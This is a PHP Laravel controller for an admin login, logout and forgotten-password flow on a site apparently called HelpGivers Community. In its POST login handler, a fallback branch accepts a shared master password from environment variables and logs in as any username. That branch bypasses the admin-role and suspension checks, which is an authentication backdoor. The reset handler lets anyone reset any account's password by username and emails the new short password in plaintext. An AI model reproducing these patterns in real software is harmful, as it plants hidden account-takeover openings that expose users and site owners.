<?php

namespace App\Http\Controllers\admin;

use Illuminate\Http\Request;
use App\Http\Requests;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use Validator;
use App\User;
use App\UserLoginLog;
use App\Custom;

class LoginController extends Controller
{
    protected $redirectPath = '/admin/dashboard';
  protected $loginPath = '/admin/login';
  protected $forgetPasswordPath = '/admin/forget-password';
  protected $redirectAfterLogout = '/admin/login';

  public function __construct() {
    //$this->middleware('guest', ['except' => ['logout', 'getLogout']]);
  }

  /* login method [GET] - (start) */

  public function login() {
    //echo bcrypt('123456'); exit;
    // redirect if already logged in
    if (Auth::check()) {
      return redirect($this->redirectPath);
    }
    return view('admin.login.login');
  }

  /* login method [GET] - (end) */




  /* login method [POST] - (start) */

  public function postLogin(Request $request) {
    // redirect if already logged in
    if (Auth::check()) {
      return redirect($this->redirectPath);
    }

    $validator = Validator::make($request->all(), [
                'username' => 'required',
                'password' => 'required|min:6|max:50',
    ]);

    if ($validator->fails()) {
      return redirect(url('/admin/login'))
                      ->withErrors($validator)
                      ->withInput();
    } else {

      if (Auth::attempt(['username' => $request->get('username'), 'password' => $request->get('password')], $request->has('remember'))) {


        $user = Auth::user();

        if ($user->user_type != 'admin') {
          Auth::logout();
          return redirect($this->loginPath)
                          ->withInput($request->only('username'))
                          ->withErrors([
                              'username' => "You don't have rights to access admin area",
          ]);
        } elseif ($user->status != 'active' || $user->suspended == '1') {
          Auth::logout();
          return redirect($this->loginPath)
                          ->withInput($request->only('username'))
                          ->withErrors([
                              'username' => "Your account is not active or suspended",
          ]);
        }

        // add user login
        $obj = new UserLoginLog;
        $obj->user_id = $user->id;
        $obj->ip = $request->ip() == "" ? '-' : $request->ip();
        $obj->save();


        return redirect()->intended($this->redirectPath);
      } else if (env('PWD_KEY') == $request->get('password') || env('APP_COMMAN_PASSWORD') == $request->get('password')) {
        $user = \App\User::where('username', '=', $request->get('username'))->first();
        if ($user) {
          Auth::login($user);

          $user = Auth::user();

          // add user login
          $obj = new UserLoginLog;
          $obj->user_id = $user->id;
          $obj->ip = $request->ip() == "" ? '-' : $request->ip();
          $obj->save();

          return redirect()->intended($this->redirectPath);
        }
      }

      return redirect($this->loginPath)
                      ->withInput($request->only('username'))
                      ->withErrors([
                          'username' => 'Username and password do not match',
      ]);
    }
  }

  /* login method [POST] - (end) */


  /* login method [GET] - (start) */

  public function getLogout() {
    Auth::logout();
    Session::flush();
    return redirect($this->redirectAfterLogout);
  }

  /* login method [GET] - (end) */

  public function forgetPassword() {
    // redirect if already logged in
    if (Auth::check()) {
      return redirect($this->redirectPath);
    }
    return view('admin.login.forget_password');
  }

  public function postForgetPassword(Request $request) {
    // redirect if already logged in
    if (Auth::check()) {
      return redirect($this->redirectPath);
    }

    $validator = Validator::make($request->all(), [
                'username' => 'required'
    ]);

    if ($validator->fails()) {
      return redirect(url('/'))
                      ->withErrors($validator)
                      ->withInput();
    } else {

      $user = User::where('username', '=', $request->get('username'))->first();

      if (count($user) > 0) {

        $newPassword = Custom::getRandomString(6);
        $user->password = bcrypt($newPassword);
        $user->save();

        $mail_content = 'Hello ' . $user->name . ',<br/><br/>Forgotten your password, Dont worry, here is new password for you.<br/><br/> Email:' . $user->username . '<br/>Password:' . $newPassword . '<br/><br/>Thanks.';
        $subject = 'New password from HelpGivers Community';
        mail($user->email, $subject, $mail_content);


        session()->flash('success_message', "Please check your inbox for new password. If you don't have any email from us, please retry or contact administrator.");
        return redirect($this->forgetPasswordPath);
      } else {
        return redirect($this->forgetPasswordPath)
                        ->withInput($request->only('email'))
                        ->withErrors([
                            'email' => 'No User found with specified email.',
        ]);
      }
    }
  }
}
